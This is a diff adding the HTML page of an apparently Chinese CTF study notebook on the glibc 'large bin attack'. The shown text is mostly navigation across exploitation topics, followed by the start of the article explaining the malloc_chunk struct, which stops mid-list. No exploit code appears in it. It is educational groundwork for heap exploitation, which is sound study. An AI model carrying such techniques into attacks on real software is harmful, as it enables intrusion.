@@ -1,0 +1,1807 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>large_bin_attack · Gitbook电子书</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="TTY">
+        
+        
+    
+    <link rel="stylesheet" href="../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search-pro/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../ptmalloc_check/ptmalloc_check.html" />
+    
+    
+    <link rel="prev" href="../how2heap学习/how2heap解析.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../../pwn基础/">
+            
+                <a href="../../pwn基础/">
+            
+                    
+                    pwn基础
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../../pwn基础/gdb使用/gdb使用.html">
+            
+                <a href="../../pwn基础/gdb使用/gdb使用.html">
+            
+                    
+                    gdb使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../../pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html">
+            
+                <a href="../../pwn基础/glibc更换_patchelf方法/glibc更换_patchelf方法.html">
+            
+                    
+                    glibc更换_patchelf方法
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../../pwn基础/linux系统调用号查询/linux系统调用号查询.html">
+            
+                <a href="../../pwn基础/linux系统调用号查询/linux系统调用号查询.html">
+            
+                    
+                    linux系统调用号查询
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4" data-path="../../pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html">
+            
+                <a href="../../pwn基础/pwn题编译时的保护选项/pwn题编译时的保护选项.html">
+            
+                    
+                    pwn题编译时的保护选项
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    fmt
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.2.1" data-path="../../fmt/fmt/fmt.html">
+            
+                <a href="../../fmt/fmt/fmt.html">
+            
+                    
+                    fmt
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.2" data-path="../../fmt/fmtstr模块/fmtstr模块.html">
+            
+                <a href="../../fmt/fmtstr模块/fmtstr模块.html">
+            
+                    
+                    fmtstr模块
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2.3" data-path="../../fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html">
+            
+                <a href="../../fmt/格式化字符串中的占位符特殊用法/格式化字符串中的占位符特殊用法.html">
+            
+                    
+                    格式化字符串中的占位符特殊用法
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../../rop/">
+            
+                <a href="../../rop/">
+            
+                    
+                    rop
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../../rop/ret2csu/ret2csu.html">
+            
+                <a href="../../rop/ret2csu/ret2csu.html">
+            
+                    
+                    ret2csu
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.2" data-path="../../rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html">
+            
+                <a href="../../rop/通过mmap&mprotect来绕过nx/通过mmap&mprotect来绕过nx.html">
+            
+                    
+                    通过mmap&mprotect来绕过nx
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.3" data-path="../../rop/srop/srop.html">
+            
+                <a href="../../rop/srop/srop.html">
+            
+                    
+                    srop
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.4" data-path="../../rop/dl_runtime_resolve/dl_runtime_resolve.html">
+            
+                <a href="../../rop/dl_runtime_resolve/dl_runtime_resolve.html">
+            
+                    
+                    dl_runtime_resolve
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.5" data-path="../../rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html">
+            
+                <a href="../../rop/dl_runtime_resolve_64位/dl_runtime_resolve_64位.html">
+            
+                    
+                    dl_runtime_resolve_64位
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3.6" data-path="../../rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html">
+            
+                <a href="../../rop/Ret2dlresolvePayload使用/Ret2dlresolvePayload使用.html">
+            
+                    
+                    Ret2dlresolvePayload使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../">
+            
+                <a href="../">
+            
+                    
+                    heap_related
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.4.1" data-path="../house_of_botcake/house_of_botcake.html">
+            
+                <a href="../house_of_botcake/house_of_botcake.html">
+            
+                    
+                    house_of_botcake
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.2" data-path="../House_of_Einherjar/House_of_Einherjar.html">
+            
+                <a href="../House_of_Einherjar/House_of_Einherjar.html">
+            
+                    
+                    House_of_Einherjar
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.3" data-path="../House_Of_Force/House_Of_Force.html">
+            
+                <a href="../House_Of_Force/House_Of_Force.html">
+            
+                    
+                    House_Of_Force
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.4" data-path="../House_of_lore/House_of_lore.html">
+            
+                <a href="../House_of_lore/House_of_lore.html">
+            
+                    
+                    House_of_lore
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.5" data-path="../House_of_Orange/House_of_Orange.html">
+            
+                <a href="../House_of_Orange/House_of_Orange.html">
+            
+                    
+                    House_of_Orange
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.6" data-path="../House_of_storm/House_of_storm.html">
+            
+                <a href="../House_of_storm/House_of_storm.html">
+            
+                    
+                    House_of_storm
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.7" data-path="../how2heap学习/how2heap解析.html">
+            
+                <a href="../how2heap学习/how2heap解析.html">
+            
+                    
+                    how2heap解析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2.4.8" data-path="large_bin_attack.html">
+            
+                <a href="large_bin_attack.html">
+            
+                    
+                    large_bin_attack
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.9" data-path="../ptmalloc_check/ptmalloc_check.html">
+            
+                <a href="../ptmalloc_check/ptmalloc_check.html">
+            
+                    
+                    ptmalloc_check
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.10" data-path="../unlink攻击敏感指针/unlink攻击敏感指针.html">
+            
+                <a href="../unlink攻击敏感指针/unlink攻击敏感指针.html">
+            
+                    
+                    unlink攻击敏感指针
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.11" data-path="../unsorted_bin相关攻击/unsorted_bin相关攻击.html">
+            
+                <a href="../unsorted_bin相关攻击/unsorted_bin相关攻击.html">
+            
+                    
+                    unsorted_bin相关攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4.12" data-path="../_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html">
+            
+                <a href="../_IO_2_1_stdout_泄露内存/_IO_2_1_stdout_泄露内存.html">
+            
+                    
+                    IO_2_1_stdout泄露内存
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="../../FILE_related/">
+            
+                <a href="../../FILE_related/">
+            
+                    
+                    FILE_related
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="../../FILE_related/close_free/fog.html">
+            
+                <a href="../../FILE_related/close_free/fog.html">
+            
+                    
+                    fog
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="../../FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html">
+            
+                <a href="../../FILE_related/FILE攻击的一些进阶操作_待补充/FILE攻击的一些进阶操作_待补充.html">
+            
+                    
+                    FILE攻击的一些进阶操作_待补充
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.3" data-path="../../FILE_related/FILE结构体概述/FILE结构体概述.html">
+            
+                <a href="../../FILE_related/FILE结构体概述/FILE结构体概述.html">
+            
+                    
+                    FILE结构体概述
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.4" data-path="../../FILE_related/FSOP/FSOP.html">
+            
+                <a href="../../FILE_related/FSOP/FSOP.html">
+            
+                    
+                    FSOP
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.5" data-path="../../FILE_related/vtable伪造/vtable伪造.html">
+            
+                <a href="../../FILE_related/vtable伪造/vtable伪造.html">
+            
+                    
+                    vtable伪造
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../../沙箱/">
+            
+                <a href="../../沙箱/">
+            
+                    
+                    沙箱
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.6.1" data-path="../../沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html">
+            
+                <a href="../../沙箱/glibc2.27下堆题绕过沙箱/glibc2.27下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.27下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.2" data-path="../../沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html">
+            
+                <a href="../../沙箱/glibc2.29下堆题绕过沙箱/glibc2.29下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.29下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.3" data-path="../../沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
+            
+                <a href="../../沙箱/glibc2.31下堆题绕过沙箱/glibc2.31下堆题绕过沙箱.html">
+            
+                    
+                    glibc2.31下堆题绕过沙箱
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.4" data-path="../../沙箱/seccomp&ptcl/seccomp&ptcl.html">
+            
+                <a href="../../沙箱/seccomp&ptcl/seccomp&ptcl.html">
+            
+                    
+                    seccomp&ptcl
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="../../../arm_pwn/">
+            
+                <a href="../../../arm_pwn/">
+            
+                    
+                    arm_pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../../../arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html">
+            
+                <a href="../../../arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html">
+            
+                    
+                    arm&aarch64汇编
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../../../arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
+            
+                <a href="../../../arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html">
+            
+                    
+                    ARMpwn基础环境搭建
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../../../arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
+            
+                <a href="../../../arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html">
+            
+                    
+                    树莓派搭建ARM环境
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="../../../kernel_pwn/">
+            
+                <a href="../../../kernel_pwn/">
+            
+                    
+                    kernel_pwn
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="../../../kernel_pwn/c文件操作/c文件操作.html">
+            
+                <a href="../../../kernel_pwn/c文件操作/c文件操作.html">
+            
+                    
+                    c文件操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="../../../kernel_pwn/kernel_pwn_rop/kernel_pwn_rop.html">
+            
+                <a href="../../../kernel_pwn/kernel_pwn_rop/kernel_pwn_rop.html">
+            
+                    
+                    kernel_pwn_rop
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.3" data-path="../../../kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.html">
+            
+                <a href="../../../kernel_pwn/linux_kernel保护机制/linux_kernel保护机制.html">
+            
+                    
+                    linux_kernel保护机制
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.4" data-path="../../../kernel_pwn/linux_kernel基础/linux_kernel基础.html">
+            
+                <a href="../../../kernel_pwn/linux_kernel基础/linux_kernel基础.html">
+            
+                    
+                    linux_kernel基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.5" data-path="../../../kernel_pwn/ropper简单使用/ropper简单使用.html">
+            
+                <a href="../../../kernel_pwn/ropper简单使用/ropper简单使用.html">
+            
+                    
+                    ropper简单使用
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5" data-path="../../../awd/">
+            
+                <a href="../../../awd/">
+            
+                    
+                    awd
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.1" data-path="../../../awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.html">
+            
+                <a href="../../../awd/awd_pwn流量转发_手动/awd_pwn流量转发_手动.html">
+            
+                    
+                    awdpwn流量转发手动
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.2" data-path="../../../awd/evilPatcher_pwn通防/evilPatcher_pwn通防.html">
+            
+                <a href="../../../awd/evilPatcher_pwn通防/evilPatcher_pwn通防.html">
+            
+                    
+                    evilPatcher_pwn通防
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.5.3" data-path="../../../awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.html">
+            
+                <a href="../../../awd/如何在awd中苟活_pwn/如何在awd中苟活_pwn.html">
+            
+                    
+                    如何在awd中苟活_pwn
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="divider"></li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" data-path="../../../IOT漏洞挖掘/">
+            
+                <a href="../../../IOT漏洞挖掘/">
+            
+                    
+                    IOT漏洞挖掘
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/">
+            
+                    
+                    IoT-vulhub学习
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1.1" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Cisco-CVE-2020-3331/Cisco-CVE-2020-3331.html">
+            
+                    
+                    Cisco-CVE-2020-3331
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.2" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/HUAWEI-CVE-2017-17215/HUAWEI-CVE-2017-17215.html">
+            
+                    
+                    HUAWEI-CVE-2017-17215
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.3" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Netgear-CVE-2019-20760/Netgear-CVE-2019-20760.html">
+            
+                    
+                    Netgear-CVE-2019-20760
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.4" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-16333/Tenda-CVE-2018-16333.html">
+            
+                    
+                    Tenda-CVE-2018-16333
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.5" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2018-5767/Tenda-CVE-2018-5767.html">
+            
+                    
+                    Tenda-CVE-2018-5767
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.6" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/Tenda-CVE-2020-10987/Tenda-CVE-2020-10987.html">
+            
+                    
+                    Tenda-CVE-2020-10987
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.7" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/TP-Link-CVE-2020-8423/TP-Link-CVE-2020-8423.html">
+            
+                    
+                    TP-Link-CVE-2020-8423
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.1.8" data-path="../../../IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html">
+            
+                <a href="../../../IOT漏洞挖掘/IoT-vulhub学习/VIVOTEK-CVE-2020-10987/VIVOTEK-CVE-2020-10987.html">
+            
+                    
+                    VIVOTEK-CVE-2020-10987
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../../../密码学/">
+            
+                <a href="../../../密码学/">
+            
+                    
+                    密码学
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../../../密码学/AES/AES.html">
+            
+                <a href="../../../密码学/AES/AES.html">
+            
+                    
+                    AES
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2.2" data-path="../../../密码学/RC4/RC4.html">
+            
+                <a href="../../../密码学/RC4/RC4.html">
+            
+                    
+                    RC4
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../../../web/">
+            
+                <a href="../../../web/">
+            
+                    
+                    web
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.1" data-path="../../../web/sql注入/sql注入.html">
+            
+                <a href="../../../web/sql注入/sql注入.html">
+            
+                    
+                    sql注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4" data-path="../../../机器学习/">
+            
+                <a href="../../../机器学习/">
+            
+                    
+                    机器学习
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.4.1" data-path="../../../机器学习/pytorch/pytorch.html">
+            
+                <a href="../../../机器学习/pytorch/pytorch.html">
+            
+                    
+                    pytorch
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.4.2" data-path="../../../机器学习/数据处理/数据处理.html">
+            
+                <a href="../../../机器学习/数据处理/数据处理.html">
+            
+                    
+                    数据处理
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../.." >large_bin_attack</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h2 id="large-bin-attack">large bin attack</h2>
+<p>&#x5927;&#x90E8;&#x5206;&#x642C;&#x8FD0;&#x81EA;<a href="https://www.anquanke.com/post/id/183877#h2-0" target="_blank">https://www.anquanke.com/post/id/183877#h2-0</a></p>
+<h4 id="mallocchunk">malloc_chunk</h4>
+<p>&#x642C;&#x8FD0;&#x4E00;&#x4E0B;wiki&#x5199;&#x7684;malloc_chunk&#x7ED3;&#x6784;&#x5427;&#xFF0C;&#x8FD9;&#x91CC;&#x4E3B;&#x8981;&#x6CE8;&#x610F;fd_nextsize&#x548C;bk_nextsize&#x7684;&#x542B;&#x4E49;&#x3002;</p>
+<pre><code class="lang-c"><span class="hljs-comment">/*
+  This struct declaration is misleading (but accurate and necessary).
+  It declares a &quot;view&quot; into memory allowing access to necessary
+  fields at known offsets from a given base. See explanation below.
+*/</span>
+<span class="hljs-keyword">struct</span> malloc_chunk {
+
+  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span>
+  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span>
+
+  <span class="hljs-keyword">struct</span> malloc_chunk* fd;         <span class="hljs-comment">/* double links -- used only if free. */</span>
+  <span class="hljs-keyword">struct</span> malloc_chunk* bk;
+
+  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span>
+  <span class="hljs-keyword">struct</span> malloc_chunk* fd_nextsize; <span class="hljs-comment">/* double links -- used only if free. */</span>
+  <span class="hljs-keyword">struct</span> malloc_chunk* bk_nextsize;
+};
+</code></pre>
+<p>&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x5177;&#x4F53;&#x7684;&#x89E3;&#x91CA;&#x5982;&#x4E0B;</p>
+<ul>
+<li><p><strong>prev_size</strong>, &#x5982;&#x679C;&#x8BE5; chunk &#x7684;<strong>&#x7269;&#x7406;&#x76F8;&#x90BB;&#x7684;&#x524D;&#x4E00;&#x5730;&#x5740; chunk&#xFF08;&#x4E24;&#x4E2A;&#x6307;&#x9488;&#x7684;&#x5730;&#x5740;&#x5DEE;&#x503C;&#x4E3A;&#x524D;&#x4E00; chunk &#x5927;&#x5C0F;&#xFF09;</strong>&#x662F;&#x7A7A;&#x95F2;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x8BE5;&#x5B57;&#x6BB5;&#x8BB0;&#x5F55;&#x7684;&#x662F;&#x524D;&#x4E00;&#x4E2A; chunk &#x7684;&#x5927;&#x5C0F; (&#x5305;&#x62EC; chunk &#x5934;)&#x3002;&#x5426;&#x5219;&#xFF0C;&#x8BE5;&#x5B57;&#x6BB5;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x5B58;&#x50A8;&#x7269;&#x7406;&#x76F8;&#x90BB;&#x7684;&#x524D;&#x4E00;&#x4E2A; chunk &#x7684;&#x6570;&#x636E;&#x3002;<strong>&#x8FD9;&#x91CC;&#x7684;&#x524D;&#x4E00; chunk &#x6307;&#x7684;&#x662F;&#x8F83;&#x4F4E;&#x5730;&#x5740;&#x7684; chunk</strong> &#x3002;</p>
+</li>
+<li><p><strong>size</strong>&#xFF0C;&#x8BE5; chunk &#x7684;&#x5927;&#x5C0F;&#xFF0C;&#x5927;&#x5C0F;&#x5FC5;&#x987B;&#x662F; 2 <em> SIZE_SZ &#x7684;&#x6574;&#x6570;&#x500D;&#x3002;&#x5982;&#x679C;&#x7533;&#x8BF7;&#x7684;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x4E0D;&#x662F; 2 </em> SIZE_SZ &#x7684;&#x6574;&#x6570;&#x500D;&#xFF0C;&#x4F1A;&#x88AB;&#x8F6C;&#x6362;&#x6EE1;&#x8DB3;&#x5927;&#x5C0F;&#x7684;&#x6700;&#x5C0F;&#x7684; 2 * SIZE_SZ &#x7684;&#x500D;&#x6570;&#x3002;32 &#x4F4D;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;SIZE_SZ &#x662F; 4&#xFF1B;64 &#x4F4D;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;SIZE_SZ &#x662F; 8&#x3002; &#x8BE5;&#x5B57;&#x6BB5;&#x7684;&#x4F4E;&#x4E09;&#x4E2A;&#x6BD4;&#x7279;&#x4F4D;&#x5BF9; chunk &#x7684;&#x5927;&#x5C0F;&#x6CA1;&#x6709;&#x5F71;&#x54CD;&#xFF0C;&#x5B83;&#x4EEC;&#x4ECE;&#x9AD8;&#x5230;&#x4F4E;&#x5206;&#x522B;&#x8868;&#x793A;</p>
+<ul>
+<li><p>NON_MAIN_ARENA&#xFF0C;&#x8BB0;&#x5F55;&#x5F53;&#x524D; chunk &#x662F;&#x5426;&#x4E0D;&#x5C5E;&#x4E8E;&#x4E3B;&#x7EBF;&#x7A0B;&#xFF0C;1 &#x8868;&#x793A;&#x4E0D;&#x5C5E;&#x4E8E;&#xFF0C;0 &#x8868;&#x793A;&#x5C5E;&#x4E8E;&#x3002;</p>
+</li>
+<li><p>IS_MAPPED&#xFF0C;&#x8BB0;&#x5F55;&#x5F53;&#x524D; chunk &#x662F;&#x5426;&#x662F;&#x7531; mmap &#x5206;&#x914D;&#x7684;&#x3002;</p>
+</li>
